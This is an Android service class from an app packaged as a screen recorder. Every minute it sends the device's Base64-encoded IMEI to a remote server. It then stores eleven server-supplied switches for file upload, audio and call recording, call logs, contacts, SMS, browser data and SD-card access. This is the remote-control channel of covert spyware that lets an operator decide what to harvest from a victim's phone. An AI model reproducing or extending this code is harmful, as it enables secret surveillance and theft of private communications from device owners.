package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;

/**
 * Created by Android on 5/6/2017.
 */

public class CheckCon extends Service {
    String imeidata;
    String buffer = "";
    public static boolean checkcon = false;
    Timer timer;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        checkcon = true;
        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- CheckCon");
                getConChk();
            }
        },2000,60500);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onStart(Intent intent, int startId) {
        checkcon = true;
        super.onStart(intent, startId);
    }

    public void getConChk(){
        checkcon = true;
        TelephonyManager tm  = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
        String IMEI = tm.getDeviceId();
        String ImeiBase = Base64.encodeToString(IMEI.getBytes(), Base64.DEFAULT);
        imeidata = ImeiBase.replaceAll("\n","");

        HttpClient httpClient = new DefaultHttpClient();
        String android_status = UrlDemo.android_status;
        HttpPost httpPost = new HttpPost(android_status);

        try {
            if (IMEI != null){
                List<NameValuePair>nameValuePairs = new  ArrayList<NameValuePair>();
                nameValuePairs.add(new BasicNameValuePair("IMEI",imeidata));
                httpPost.setEntity( (HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                HttpResponse httpResponse = httpClient.execute(httpPost);
                httpResponse.getStatusLine();
                HttpEntity httpEntity = httpResponse.getEntity();
                httpEntity = httpResponse.getEntity();
                InputStream in = httpEntity.getContent();
                buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }
                in.close();
                if (httpEntity != null) {
                    httpEntity.consumeContent();
                }
                Log.d("Response", "Response of checkCon" + buffer);

                SharedPreferences sp = getSharedPreferences("key", 0);
                SharedPreferences.Editor sedt = sp.edit();
                sedt.putString("textvalue", buffer);
                sedt.commit();

                String arr[] = Split(buffer, "," );
                Log.d("CheckConSplit","CheckCon" +arr);
                System.out.println("checkconSplitArry"+arr[0]);
                System.out.println("checkconSplitArry"+arr[1]);
                System.out.println("CheckconSplitArry"+arr[2]);
                System.out.println("CheckconSplitArry"+arr[3]);
                System.out.println("CheckconSplitArry"+arr[4]);
                System.out.println("CheckconSplitArry"+arr[5]);
                System.out.println("CheckconSplitArry"+arr[6]);
                System.out.println("CheckconSplitArry"+arr[7]);
                System.out.println("CheckconSplitArry"+arr[8]);
                System.out.println("CheckconSplitArry"+arr[9]);
                System.out.println("CheckconSplitArry"+arr[10]);

                String chkconzero = arr[0];
                SharedPreferences sp1 = getSharedPreferences("key", 0);
                SharedPreferences.Editor sedt1 = sp1.edit();
                sedt1.putString("chkzero", chkconzero);
                sedt1.commit();

                String chkconfileupload = arr[1];
                SharedPreferences spfileupload = getSharedPreferences("key", 0);
                SharedPreferences.Editor sedtfileupload = spfileupload.edit();
                sedtfileupload.putString("chkfileupload", chkconfileupload);
                sedtfileupload.commit();

                String chkwifi = arr[2];
                SharedPreferences spwifi = getSharedPreferences("key",0);
                SharedPreferences.Editor spewifi = spwifi.edit();
                spewifi.putString("chkwifi",chkwifi);
                spewifi.commit();

                String chkrecord = arr[3];
                SharedPreferences sprecord = getSharedPreferences("key",0);
                SharedPreferences.Editor sperecord = sprecord.edit();
                sperecord.putString("chkrecord",chkrecord);
                sperecord.commit();

                String chkcallrecord = arr[4];
                SharedPreferences spcallrecord = getSharedPreferences("key",0);
                SharedPreferences.Editor specallrecord = spcallrecord.edit();
                specallrecord.putString("chkcallrecord",chkcallrecord);
                specallrecord.commit();

                String chksdcard = arr[5];
                SharedPreferences spsdcard = getSharedPreferences("key",0);
                SharedPreferences.Editor spesdcard = spsdcard.edit();
                spesdcard.putString("chksdcard",chksdcard);
                spesdcard.commit();

                String chkcallog = arr[6];
                SharedPreferences spcallog = getSharedPreferences("key",0);
                SharedPreferences.Editor specallog = spcallog.edit();
                specallog.putString("chkcallog",chkcallog);
                specallog.commit();

                String chkcontact = arr[7];
                SharedPreferences spcontact = getSharedPreferences("key",0);
                SharedPreferences.Editor specontact =spcontact.edit();
                specontact.putString("chkcontact",chkcontact);
                specontact.commit();

                String chkbrowser = arr[8];
                SharedPreferences spbrowser= getSharedPreferences("key",0);
                SharedPreferences.Editor spebrowser =spbrowser.edit();
                spebrowser.putString("chkbrowser",chkbrowser);
                spebrowser.commit();

                String chkdevice = arr[9];
                SharedPreferences spdevice = getSharedPreferences("key",0);
                SharedPreferences.Editor spedevice = spdevice.edit();
                spedevice.putString("chkdevice",chkdevice);
                spedevice.commit();

                String chksms = arr [10];
                SharedPreferences spsms = getSharedPreferences("key",0);
                SharedPreferences.Editor spesms = spsms.edit();
                spesms.putString("chksms",chksms);
                spesms.commit();



            }//if imei
            else {
                Log.d("Imei Null value","else imei null");
            }
        }
        catch (Exception e){
            Log.d("CheckCon Error","Exception" +e);
        }
    }//getConChk

    private static String[] Split(String splitStr, String delimiter) {
        try
        {

            StringBuffer token = new StringBuffer();
            Vector tokens = new Vector();
            // split
            char[] chars = splitStr.toCharArray();
            for (int i = 0; i < chars.length; i++) {
                if (delimiter.indexOf(chars[i]) != -1) {
                    if (token.length() > 0) {
                        tokens.addElement(token.toString());
                        token.setLength(0);
                    }
                } else {
                    token.append(chars[i]);
                }
            }
            if (token.length() > 0) {
                tokens.addElement(token.toString());
            }
            String[] splitArray = new String[tokens.size()];
            for (int i = 0; i < splitArray.length; i++) {
                splitArray[i] = (String) tokens.elementAt(i);
            }
            return splitArray;
        }
        catch(Exception e)
        {
            return null;
        }

    }

    @Override
    public void onDestroy() {
        checkcon = false;
        try {
        timer.cancel();
        } catch (Exception e) {}
        stopSelf();
        super.onDestroy();
    }

}
